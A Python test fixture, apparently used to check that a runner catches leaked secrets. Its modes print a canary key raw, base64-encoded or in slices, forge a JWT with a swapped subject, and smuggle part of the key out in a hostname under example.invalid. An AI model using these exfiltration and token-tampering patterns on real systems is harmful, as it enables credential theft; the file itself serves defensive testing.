"""A probe flow for the runner's tests: plain urllib, talks to the mock only.

It sends its canary APP_KEY to the mock's model API as a bearer token,
exports one span over OTLP/JSON, and writes the canary to SIDE_FILE so the
test can check the runner's output against it. MODE changes what it does:
`leak` puts the canary in the span name, `print` prints it raw on stdout
and inside a base64 Basic credential on stderr, `fragment` prints a slice
of it on each stream and its first PREFIX_LENGTH characters, `jwt` asks
the mock's OAuth endpoints for an ID token, writes it to SIDE_FILE.jwt and
prints a slice of its signature and another JWT, built the way a client
of the same issuer would build its own, which it also requests from the
mock as a path, `egress` asks the mock's proxy for EGRESS_HOST, if set,
or else a host named by 10 characters of the canary's random part (after
PREFIX_LENGTH), which the mock refuses, `crash` exits 5. Every mode also prints PLAIN, if set, on
stdout, and ends each printed line with NEWLINE, if set.
"""

from __future__ import annotations

import base64
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, body: bytes, headers: dict[str, str]) -> None:
    request = urllib.request.Request(url, data=body, headers=headers)
    with urllib.request.urlopen(request, timeout=10) as response:
        response.read()


def other_jwt(token: str) -> str:
    """token's header and claims with another subject and signature."""
    header, payload, _ = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims["sub"] = "0" * len(claims["sub"])
    encoded = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
    return f"{header}.{encoded}.{'A' * 43}"


def jwt(mock: str, side_file: str) -> None:
    form = {"grant_type": "client_credentials", "scope": "openid"}
    request = urllib.request.Request(
        mock + "/oauth/token",
        data=urllib.parse.urlencode(form).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        token = json.loads(response.read())["id_token"]
    with open(side_file + ".jwt", "w", encoding="utf-8") as side:
        side.write(token)
    other = other_jwt(token)
    print("session", other)
    print("signature", token.rsplit(".", 1)[1][10:22])
    try:
        urllib.request.urlopen(f"{mock}/session/{other}", timeout=10).read()
    except urllib.error.HTTPError as unmocked:
        unmocked.close()


def main() -> None:
    if "NEWLINE" in os.environ:
        for stream in (sys.stdout, sys.stderr):
            stream.reconfigure(newline=os.environ["NEWLINE"])  # type: ignore[union-attr]
    key = os.environ["APP_KEY"]
    with open(os.environ["SIDE_FILE"], "w", encoding="utf-8") as side:
        side.write(key)
    mode = os.environ.get("MODE", "")
    post(
        os.environ["CANARY_MOCK_URL"] + "/v1/chat/completions",
        b"{}",
        {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
    )
    name = f"leaky span {key}" if mode == "leak" else "clean span"
    doc = {"resourceSpans": [{"scopeSpans": [{"spans": [{"name": name}]}]}]}
    post(
        os.environ["OTEL_EXPORTER_OTLP_TRACES_ENDPOINT"],
        json.dumps(doc).encode(),
        {"Content-Type": "application/json"},
    )
    if "PLAIN" in os.environ:
        print(os.environ["PLAIN"])
    if mode == "fragment":
        middle = len(key) // 2
        print("slice", key[middle - 6 : middle + 6])
        print("tail", key[-12:], file=sys.stderr)
        print("prefix", key[: int(os.environ.get("PREFIX_LENGTH", "0"))])
    if mode == "jwt":
        jwt(os.environ["CANARY_MOCK_URL"], os.environ["SIDE_FILE"])
    if mode == "egress":
        start = int(os.environ.get("PREFIX_LENGTH", "0")) + 2
        host = os.environ.get("EGRESS_HOST", f"{key[start : start + 10]}.example.invalid")
        try:
            urllib.request.urlopen(f"http://{host}/x", timeout=10)
        except urllib.error.HTTPError as refused:
            refused.close()
    if mode == "print":
        print("raw", key)
        print("b64", base64.b64encode(f"u:{key}".encode()).decode(), file=sys.stderr)
    if mode == "crash":
        sys.exit(5)


if __name__ == "__main__":
    main()
